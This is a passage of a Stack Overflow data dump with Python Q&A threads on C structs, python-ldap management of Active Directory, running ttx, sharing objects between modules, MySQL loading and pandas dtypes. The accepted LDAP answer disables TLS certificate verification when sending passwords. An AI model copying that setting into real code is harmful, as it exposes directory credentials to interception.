"https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427932162, "post_id": 29399054, "comment_id": 46980987, "body": "Yes, C <code>struct</code>s are mutable. <code>namedtuple</code>s are not."}, {"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "reply_to_user": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427933948, "post_id": 29399054, "comment_id": 46981465, "body": "Ahh, misread your comment, though the list in the namedtuple is mutable."}], "tags": [], "owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "is_accepted": false, "score": 0, "last_activity_date": 1427915992, "creation_date": 1427915992, "answer_id": 29399054, "question_id": 29398285, "link": "https://stackoverflow.com/questions/29398285/how-would-this-c-struct-be-translated-into-python/29399054#29399054", "title": "How would this C struct be translated into Python", "body": "<p>You can use namedtuples to construct classes that can represent your structs:</p>\n\n<pre><code>from collections import namedtuple\ndataT = namedtuple(\"dataT\", ['m'])\nstack = namedtuple(\"stack\", ['top', 'items'])\n\nst = stack(0, [])\nst.items.append(dataT(5))\nst.items[st.top].m\n</code></pre>\n\n<p>Though you will probably find that the stack class is unnecessary as pointed out list already has this behaviour.</p>\n"}], "owner": {"reputation": 11, "user_id": 4739545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50ade13e58d80ac38d4c4003861de004?s=128&d=identicon&r=PG&f=1", "display_name": "Benjer", "link": "https://stackoverflow.com/users/4739545/benjer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1427915992, "creation_date": 1427913407, "question_id": 29398285, "link": "https://stackoverflow.com/questions/29398285/how-would-this-c-struct-be-translated-into-python", "title": "How would this C struct be translated into Python", "body": "<p>I'm pretty new to Python and I'm having difficulty figuring out how to use the structs. What would the C structs below look like when they are converted into Python?</p>\n\n<p>These are the structs I have:</p>\n\n<pre><code>struct dataT\n{\n    int m;\n};\n\nstruct stack\n{\n    int top;\n    struct dataT items[STACKSIZE];\n} st;\n</code></pre>\n\n<p>How would this statement be represented in Python?</p>\n\n<pre><code>st.items[st.top].m\n</code></pre>\n"}, {"tags": ["python", "active-directory", "python-ldap"], "answers": [{"tags": [], "owner": {"reputation": 117, "user_id": 4735386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b32e2ac4e62c584b3c1d6a4658d01c6a?s=128&d=identicon&r=PG&f=1", "display_name": "sk8sleeprepeat", "link": "https://stackoverflow.com/users/4735386/sk8sleeprepeat"}, "is_accepted": true, "score": 6, "last_activity_date": 1428004653, "last_edit_date": 1495540496, "creation_date": 1428004653, "answer_id": 29421407, "question_id": 29398242, "link": "https://stackoverflow.com/questions/29398242/use-python-script-to-manage-remote-ldap-server/29421407#29421407", "title": "Use Python script to manage remote LDAP server", "body": "<p><strong>Working Query search!</strong><br>\nCredit to:<br>\n<a href=\"http://www.linuxjournal.com/article/6988?page=0,0\" rel=\"nofollow noreferrer\">http://www.linuxjournal.com/article/6988?page=0,0</a>  </p>\n\n<pre><code>import ldap\n\ndef main():\n\n    keyword = \"user_query\"\n\n    try:\n        l = ldap.open(serverIp)\n        l.simple_bind_s(\"myUserName@adtest.local\", \"password\")\n        print \"successfully bound to server.\\n\"\n\n        print \"Searching..\\n\"\n        my_search(l,keyword)\n    except ldap.LDAPError, e:\n        print \"Couldn't connect. %s \" % e\n\ndef my_search(l, keyword):\n    #Base is for the DN(Distinguised Name) of the entry where the search should start\n    base = \"cn=Users,dc=adtest,dc=local\"\n    #Scope has three options, SUBTREE searches all sub-folder/directories\n    scope = ldap.SCOPE_SUBTREE\n    #filter consists of a cn(common name) and keyword.\n    #putting asterisks around our keyword will match anything containing the string\n    f = \"cn=\" + \"*\" + keyword + \"*\"\n    #determines which attributes to return. Returns all if set to \"None\"\n    retrieve_attributes = None\n\n    count = 0\n    result_set = []\n    timeout = 0\n    result = l.search_s(base, scope, f, retrieve_attributes)\n    print result[0][1].keys()\n    try:\n        result_id = l.search(base, scope, f, retrieve_attributes)\n        while 1:\n            result_type, result_data = l.result(result_id, timeout)\n            if(result_data == []):\n                break\n            else:\n                if result_type == ldap.RES_SEARCH_ENTRY:\n                    result_set.append(result_data)\n        if len(result_set) == 0:\n            print \"No Results\"\n            return\n        for i in range(len(result_set)):\n            for entry in result_set[i]:\n                try:\n                    name = entry[1]['cn'][0]\n                    count += 1\n                    print str(count)+\" \"+name\n                except:\n                    pass\n    except ldap.LDAPError, e:\n        print e\n\nif __name__=='__main__':\n    main()\n</code></pre>\n\n<p>I fixed the one mistake in my code, but still couldn't set certain properties because LDAP uses plain-text and does not allow private info to be sent without a secure connection.\nIn order to add/modify user password info and userAccountControl flags(to enable a user), I switched to LDAPS using port 636, which I enabled on the server by adding Active Directory Certificate Services(*requires you to restart the server).<br>\nAdditionally you need to include the 'ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT,0)' line before you initialize.</p>\n\n<p><strong>Working Add User</strong><br>\nCredit to:<br>\n<a href=\"https://stackoverflow.com/questions/16051839/how-to-set-lockouttime-and-password-of-a-user-of-active-directory\">how to set lockoutTime and password of a user of Active Directory</a>  </p>\n\n<pre><code>import ldap\nimport ldap.modlist as modlist\n\nldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT,0)\nl = ldap.initialize(\"ldaps://10.99.0.214:636\")\nl.set_option(ldap.OPT_PROTOCOL_VERSION, 3)\nl.set_option(ldap.OPT_NETWORK_TIMEOUT, 10.0)\nt = l.simple_bind_s(\"myUserName@adtest.local\",\"password\")\n\ndn=\"cn=TestUser,cn=Users,dc=adtest,dc=local\"\n\n#make a unicode password to set for user\nunicode_pass = unicode('\\\"'+\"userPwd\"+'\\\"', 'iso-8859-1')\npassword_value = unicode_pass.encode('utf-16-le')\n\n#What I set for my users, you can find more by looking through a user's properties on your DC.\nattrs = {}\nattrs['cn'] = 'TestUser'\nattrs['displayName'] = 'TestUser'\nattrs['givenName'] = 'Test'\nattrs['mail'] = 'testuser@company.com'\nattrs['name'] = 'Test User'\nattrs['objectclass'] = ['top','person','organizationalPerson','user']\nattrs['sAMAccountName'] = 'testuser'\nattrs['sn'] = 'User'\nattrs['unicodepwd'] = password_value\nattrs['userPrincipalName'] = 'testuser@adtest.local'\n\nldif = modlist.addModlist(attrs)\n\nl.add_s(dn,ldif)\n\n#Now that the user is created and has a password(needs to meet AD requirements), they can be enabled \n\n#For full userAccountControl flag list:\n#http://support.microsoft.com/en-us/kb/305144\nmod_acct = [(ldap.MOD_REPLACE, 'userAccountControl', '66048')]\ntry:\n    l.modify_s(dn, mod_acct)\nexcept ldap.LDAPError, e:\n    print e\n\nl.unbind_s()\n</code></pre>\n"}], "owner": {"reputation": 117, "user_id": 4735386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b32e2ac4e62c584b3c1d6a4658d01c6a?s=128&d=identicon&r=PG&f=1", "display_name": "sk8sleeprepeat", "link": "https://stackoverflow.com/users/4735386/sk8sleeprepeat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5307, "favorite_count": 1, "accepted_answer_id": 29421407, "answer_count": 1, "score": 2, "last_activity_date": 1428004682, "creation_date": 1427913249, "last_edit_date": 1428004682, "question_id": 29398242, "link": "https://stackoverflow.com/questions/29398242/use-python-script-to-manage-remote-ldap-server", "title": "Use Python script to manage remote LDAP server", "body": "<p>Background:\nI am working on an API to centralize user creation and management for multiple resources(e.g. Google Apps, Dropbox, etc...). \nOn a Linux VM, I developed an API and web interface that allows me(and my co-admins) to authenticate and manage user accounts for these services.\nThe next thing I need to integrate is our Active Directory which is hosted on a remote Windows Server 2008.</p>\n\n<p>I have been trying to use python-ldap to connect to and retrieve/modify information but have had issues with DIR_ERROR operations errors(when trying to query for users) and NAMING_VIOLATION errors(when trying to add users). </p>\n\n<p>*Code based on <a href=\"http://www.grotan.com/ldap/python-ldap-samples.html\" rel=\"nofollow\">http://www.grotan.com/ldap/python-ldap-samples.html</a>, stackoverflow questions, and python-ldap documentation\nBinding code that I believe works:</p>\n\n<pre><code>import ldap\ntry:\n    l = ldap.open(\"serverip\")\n    l.protocol_version = ldap.VERSION3  \n\n    username = \"myUserName@adtest.local\"\n    password  = \"secret\"\n\n    result = l.simple_bind(username, password)\n    print result\n\nexcept ldap.LDAPError, e:\n    print e\n</code></pre>\n\n<p>which prints:\n(97, [], 1, [])</p>\n\n<p>Query for users script:\n(tried without bind as suggested by article, but received \"In order to perform this operation a successful bind must be completed on the connection.\")</p>\n\n<pre><code>import ldap\n\ntry:\n    l = ldap.open(\"serverIp\", port=389)\n    l.protocol_version = ldap.VERSION3  \n    username = \"myUserName@adtest.local\"\n    password  = \"secret\"\n\n    result = l.simple_bind(username, password)\n    print result\nexcept ldap.LDAPError, e:\n    print e\n    # handle error however you like\n\nbaseDN = \"ou=Users, o=adtest.local\"\nsearchScope = ldap.SCOPE_SUBTREE\nretrieveAttributes = None \nsearchFilter = \"cn=*myUserName*\"\n\ntry:\n    ldap_result_id = l.search(baseDN, searchScope, searchFilter, retrieveAttributes)\n    result_set = []\n    while 1:\n        result_type, result_data = l.result(ldap_result_id, 0)\n        if (result_data == []):\n            break\n        else:\n            if result_type == ldap.RES_SEARCH_ENTRY:\n                result_set.append(result_data)\n    print result_set\nexcept ldap.LDAPError, e:\n    print e\n</code></pre>\n\n<p>which results in the following:\n(97, [], 1, [])\n{'info': '000020D6: SvcErr: DSID-031007DB, problem 5012 (DIR_ERROR), data 0\\n','desc':'Operations error'}</p>\n\n<p>Add user script:(using ldaps)</p>\n\n<pre><code>import ldap\nimport ldap.modlist as modlist\n\n# Open a connection\nl = ldap.initialize(\"ldaps://serverIp:636/\")\n\n# Bind/authenticate with a user with apropriate rights to add objects\nl.simple_bind_s(\"myUserName@adtest.local\",\"secret\")\n\n# The dn of our new entry/object\ndn=\"cn=test,dc=adtest,dc=local\" \n\n# A dict to help build the \"body\" of the object\nattrs = {}\nattrs['objectclass'] = ['top','organizationalRole','simpleSecurityObject']\nattrs['cn'] = 'test'\nattrs['userPassword'] = 'aDifferentSecret'\nattrs['description'] = 'test user'\n\n# Convert our dict to nice syntax for the add-function using modlist-module\nldif = modlist.addModlist(attrs)\n\n# Do the add-operation to the ldapserver\nl.add_s(dn,ldif)\n\n# Disconnect and free resources when done\nl.unbind_s()\n</code></pre>\n\n<p>Which results in:\nldap.SERVER_DOWN: {'info': 'A TLS packet with unexpected length was received.','desc': \"Can't contact LDAP server\"}</p>\n\n<p>*This made me think that the port might be the problem, so I changed the initialize line to <code>l = ldap.initialize(\"ldap://serverIp:389/\")</code> similar to the other two scripts.</p>\n\n<p>Now I get:\nldap.NAMING_VIOLATION: {'info': \"00002099: NameErr: DSID-0305109C, problem 2005 (NAMING_VIOLATION), data 0, best match of:\\n\\t'dc=adtest, dc=local'\\n\", 'desc': 'Naming violation'}</p>\n\n<p>Additionally, I have messed around with adding the ou and uid to the attrs but no change in error.</p>\n\n<p>What am I doing wrong or what could I try to do differently?\nThank you for any help/suggestions!</p>\n\n<p>edit: I checked my server, and port 636 is correctly set to allow Secure LDAP traffic, so I don't know why that was giving me different errors than the normal LDAP.\nedit2: I tried changing the following line in my add script\n    dn=\"cn=test,dc=adtest.local\" </p>\n\n<p>and the new output(stack trace) I have is(I added the print statement in to show that the bind is actually taking place now before the error):<br>\n    (97, [], 1, [])<br>\n    Traceback (most recent call last):<br>\n    File \"test2.py\", line 21, in <code>&lt;module&gt;</code><br>\n    l.add_s(dn,ldif)<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 202, in add_s<br>\n    return self.result(msgid,all=1,timeout=self.timeout)<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 465, in result<br>\n    resp_type, resp_data, resp_msgid = self.result2(msgid,all,timeout)<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 469, in result2<br>\n    resp_type, resp_data, resp_msgid, resp_ctrls = self.result3(msgid,all,timeout)<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 476, in result3<br>\n    resp_ctrl_classes=resp_ctrl_classes<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 483, in result4<br>\n    ldap_result = self._ldap_call(self._l.result4,msgid,all,timeout,add_ctrls,add_intermediates,add_extop)<br>\n    File \"/usr/local/lib/python2.7/dist-packages/ldap/ldapobject.py\", line 106, in _ldap_call<br>\n    result = func(*args,**kwargs)<br>\n    ldap.REFERRAL: {'info': 'Referral:\\nldap://adtest.local/cn=test,dc=adtest.local', 'desc': 'Referral'}</p>\n"}, {"tags": ["python", "fonts"], "answers": [{"comments": [{"owner": {"reputation": 11962, "user_id": 1252748, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9DbOP.gif?s=128&g=1", "display_name": "1252748", "link": "https://stackoverflow.com/users/1252748/1252748"}, "edited": false, "score": 0, "creation_date": 1427913487, "post_id": 29398295, "comment_id": 46972536, "body": "Thanks. What is this doing exactly?"}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "reply_to_user": {"reputation": 11962, "user_id": 1252748, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9DbOP.gif?s=128&g=1", "display_name": "1252748", "link": "https://stackoverflow.com/users/1252748/1252748"}, "edited": false, "score": 0, "creation_date": 1427913753, "post_id": 29398295, "comment_id": 46972704, "body": "you probably need <code>&quot;ttx fonts&#47;{file}&quot;.format(file=file)</code>"}, {"owner": {"reputation": 11962, "user_id": 1252748, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9DbOP.gif?s=128&g=1", "display_name": "1252748", "link": "https://stackoverflow.com/users/1252748/1252748"}, "edited": false, "score": 0, "creation_date": 1427913777, "post_id": 29398295, "comment_id": 46972717, "body": "yeah, you hit it. that was my problem."}], "tags": [], "owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "is_accepted": true, "score": 1, "last_activity_date": 1427913598, "last_edit_date": 1427913598, "creation_date": 1427913441, "answer_id": 29398295, "question_id": 29398236, "link": "https://stackoverflow.com/questions/29398236/calling-ttx-in-loop-causing-an-error/29398295#29398295", "title": "Calling ttx in loop causing an error", "body": "<p>just change it to </p>\n\n<pre><code>os.system(\"ttx {file}\".format(file=file))\n</code></pre>\n\n<p>this will run it in your shell (bash or whatever), there are lots of ways of doing this, this is just one and it is the easiest for new users</p>\n\n<p><code>ttx file</code> is not a python statement , so of coarse you get a syntax error</p>\n\n<p>you can debug it pretty easily</p>\n\n<pre><code>cmd = \"ttx {file}\".format(file=file)\nprint(\"RUN:\",cmd)\nprint(\"CWD:\",os.getcwd())\nos.system(cmd)\n</code></pre>\n"}], "owner": {"reputation": 11962, "user_id": 1252748, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9DbOP.gif?s=128&g=1", "display_name": "1252748", "link": "https://stackoverflow.com/users/1252748/1252748"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "accepted_answer_id": 29398295, "answer_count": 1, "score": 0, "last_activity_date": 1427913598, "creation_date": 1427913218, "last_edit_date": 1592644375, "question_id": 29398236, "link": "https://stackoverflow.com/questions/29398236/calling-ttx-in-loop-causing-an-error", "title": "Calling ttx in loop causing an error", "body": "<p>I am trying to use <a href=\"http://sourceforge.net/projects/fonttools/\" rel=\"nofollow noreferrer\">FontTools</a> to convert otf and ttf fonts to XML.</p>\n<pre><code>#!/usr/bin/python\n\nimport os, sys, fnmatch, re\n\npath = &quot;fonts/&quot;\ndirs = os.listdir( path )\n\nfor file in dirs:\n    print file\n    ttx file\n</code></pre>\n<p>I get the following error however</p>\n<blockquote>\n<p>File &quot;listCharacters&quot;, line 16</p>\n<pre><code>ttx file\n\n       ^ SyntaxError: invalid syntax\n</code></pre>\n</blockquote>\n<p><code>ttx</code> is the command to run the XML conversion. I cannot understand what the problem is here, but this represents my entire experience with this language, so hopefully it is simple.</p>\n"}, {"tags": ["python", "python-2.7"], "comments": [{"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427913467, "post_id": 29398177, "comment_id": 46972524, "body": "Can you post your code?"}, {"owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427913709, "post_id": 29398177, "comment_id": 46972677, "body": "@KSFT I added some code similar to my actual one."}, {"owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427913774, "post_id": 29398177, "comment_id": 46972714, "body": "@KSFT Basically my question is that I have a data object created by one script. How do I update it from another script?"}, {"owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427914105, "post_id": 29398177, "comment_id": 46972883, "body": "Why can&#39;t you just pass the object to the &quot;monitor&quot; script?"}, {"owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427914422, "post_id": 29398177, "comment_id": 46973072, "body": "@KSFT Actually, the data object is like a buffer. I will be adding tasks to it at various points from different scripts that are part of the program. The buffer will be executed at regular intervals of time. So, is the only way to do this is by passing the object to every script that may update it?"}, {"owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "reply_to_user": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "edited": false, "score": 0, "creation_date": 1427914582, "post_id": 29398177, "comment_id": 46973156, "body": "@KSFT There is an answer to this question which also says to pass the object to all the scripts that may update it. I will go with that. Thank you."}], "answers": [{"comments": [{"owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "edited": false, "score": 0, "creation_date": 1427914488, "post_id": 29398562, "comment_id": 46973108, "body": "The data object (which is a buffer) will have to be updated from other scripts also apart from the monitor script. So do I pass the buffer to all the scripts that may update it? It seems like it&#39;s the best way to do so."}, {"owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "reply_to_user": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "edited": false, "score": 0, "creation_date": 1427915499, "post_id": 29398562, "comment_id": 46973688, "body": "Yes, explicitly pass it around where you need it to go."}], "tags": [], "owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "is_accepted": false, "score": 1, "last_activity_date": 1427914365, "creation_date": 1427914365, "answer_id": 29398562, "question_id": 29398177, "link": "https://stackoverflow.com/questions/29398177/how-to-access-and-modify-the-contents-of-one-object-created-by-one-script-from-a/29398562#29398562", "title": "How to access and modify the contents of one object created by one script from another script in python?", "body": "<p>Unless you explicitly pass your data structure to the monitor module, you're going to run into issues.  Globals exist at the module level and aren't directly shared, even when you import a resource from one module to another.</p>\n"}], "owner": {"reputation": 1122, "user_id": 2216108, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1c39da234d4fed8285ed0666ad0a19de?s=128&d=identicon&r=PG", "display_name": "aste123", "link": "https://stackoverflow.com/users/2216108/aste123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1427914365, "creation_date": 1427913043, "last_edit_date": 1427913974, "question_id": 29398177, "link": "https://stackoverflow.com/questions/29398177/how-to-access-and-modify-the-contents-of-one-object-created-by-one-script-from-a", "title": "How to access and modify the contents of one object created by one script from another script in python?", "body": "<p>I have 3 scripts written in python.</p>\n\n<blockquote>\n  <ol>\n  <li>an initialization script </li>\n  <li>a script that contains a custom data structure class</li>\n  <li>a monitoring script.</li>\n  </ol>\n</blockquote>\n\n<p>The initialization script starts first. It creates the object of the custom data structure and then starts the monitoring script.\nThe monitoring script at certain points will send values to fill up the object that was created in the initialization script.</p>\n\n<p>So, basically there is a global data object created by the initialization script. The monitoring script will add data to that object. The data object is like a buffer which contains tasks to be executed later.</p>\n\n<p>How do I accomplish the task of adding data to the data object from the monitor script?</p>\n\n<p>Example scripts:</p>\n\n<p>initialization script:</p>\n\n<pre><code>import monitorscript\nimport customDataStructure\n\n# creates the object for the customDataStructure\n# starts the monitor script\n</code></pre>\n\n<p>custom data structure:</p>\n\n<pre><code>class mydata(object):\n    def __init__(self, arg1 = None, arg2 = None):\n       self.arg1 = arg1\n       self.arg2 = arg2\n\nclass mydata2(mydata):\n    def __init__(self):\n        self.queue = []\n        self.length = 0\n    def addTask(self, data): # adds a task to be executed into the buffer.\n        self.queue.append(data) # data is a mydata object.\n        self.length += 1\n    # some other methods.\n</code></pre>\n\n<p>monitor script:</p>\n\n<pre><code># from this script I want to be able to add values to the data object created earlier.\n</code></pre>\n\n<p>If my question is unclear or needs more information, please ask me in the comments.\nI might very well be missing a whole programming concept over here. So, if you can tell me what I need to look into, I will be very grateful.</p>\n\n<p>In short, I need to be able to update the data object created by one script by using another script. This data object is a buffer which will be processed separately at regular intervals.</p>\n"}, {"tags": ["python", "mysql"], "comments": [{"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1427915226, "post_id": 29398144, "comment_id": 46973541, "body": "Why are you using <code>cat</code>?  Why are you using a shell?"}, {"owner": {"reputation": 228, "user_id": 3327034, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/334abda307f061a5ef47e05f8da32935?s=128&d=identicon&r=PG&f=1", "display_name": "user3327034", "link": "https://stackoverflow.com/users/3327034/user3327034"}, "reply_to_user": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1427915349, "post_id": 29398144, "comment_id": 46973603, "body": "the <code>cat</code> is just for representation here. I&#39;ve a data stream instead of <code>cat</code> in the above example."}], "owner": {"reputation": 228, "user_id": 3327034, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/334abda307f061a5ef47e05f8da32935?s=128&d=identicon&r=PG&f=1", "display_name": "user3327034", "link": "https://stackoverflow.com/users/3327034/user3327034"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 553, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1427966936, "creation_date": 1427912944, "last_edit_date": 1427914317, "question_id": 29398144, "link": "https://stackoverflow.com/questions/29398144/mysql-load-file-using-pipe", "title": "mysql load file using pipe", "body": "<p>How do I use pipe to mysql load data infile using python? The below doesn't seem to be working. Local infile expect file and so not sure if its failing because of that.</p>\n\n<pre><code>cat = Popen([\"cat /Users/test/filename.out\"], stdout=PIPE, bufsize=-1, shell=True)\nload = \"\"\"load data local infile - into table %s fields terminated by '|' lines terminated by '\\\\n';\"\"\" % (tablename)\n\nwith conn:\n    cursor = conn.cursor()\n    for line in cat.stdout:\n        cursor.execute(load.stdin.write(line))\ncat.stdout.close()\ncat.wait()\nload.stdin.close()\nload.wait()\n</code></pre>\n"}, {"tags": ["python", "pandas", "types"], "comments": [{"owner": {"reputation": 44364, "user_id": 2487184, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d8cd1dea84cfe8312c532088a0da08e8?s=128&d=identicon&r=PG", "display_name": "CT Zhu", "link": "https://stackoverflow.com/users/2487184/ct-zhu"}, "edited": false, "score": 0, "creation_date": 1427914235, "post_id": 29398130, "comment_id": 46972961, "body": "There was a ticket for this function. See <a href=\"https://github.com/pydata/pandas/issues/5891\" rel=\"nofollow noreferrer\">github.com/pydata/pandas/issues/5891</a>."}], "answers": [{"comments": [{"owner": {"reputation": 44364, "user_id": 2487184, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d8cd1dea84cfe8312c532088a0da08e8?s=128&d=identicon&r=PG", "display_name": "CT Zhu", "link": "https://stackoverflow.com/users/2487184/ct-zhu"}, "edited": false, "score": 1, "creation_date": 1427914313, "post_id": 29398362, "comment_id": 46973003, "body": "worth noting that <code>dtypes</code> option is not available for <code>pd.read_excel()</code>"}, {"owner": {"reputation": 13024, "user_id": 5276797, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fad4546242573f7961ec20dd6ee6875?s=128&d=identicon&r=PG&f=1", "display_name": "IanS", "link": "https://stackoverflow.com/users/5276797/ians"}, "edited": false, "score": 0, "creation_date": 1525784911, "post_id": 29398362, "comment_id": 87486136, "body": "It is now (as of pandas 0.20)."}], "tags": [], "owner": {"reputation": 96, "user_id": 4325344, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-mG6zY8B7HnM/AAAAAAAAAAI/AAAAAAAAAo4/2OcSluqN2H8/photo.jpg?sz=128", "display_name": "Daniel Marasco", "link": "https://stackoverflow.com/users/4325344/daniel-marasco"}, "is_accepted": true, "score": 0, "last_activity_date": 1427914100, "last_edit_date": 1427914100, "creation_date": 1427913685, "answer_id": 29398362, "question_id": 29398130, "link": "https://stackoverflow.com/questions/29398130/changing-data-type-with-pandas-on-read-excel/29398362#29398362", "title": "Changing data type with pandas on read_excel", "body": "<p>You can convert to string with formatting:</p>\n\n<pre><code>df[\"DEPS\"]=df[\"DEPS\"].map(lambda x:'{0:03d}'.format(int(x)))\n</code></pre>\n\n<p>convert to int to drop decimal place and convert int to string with 3 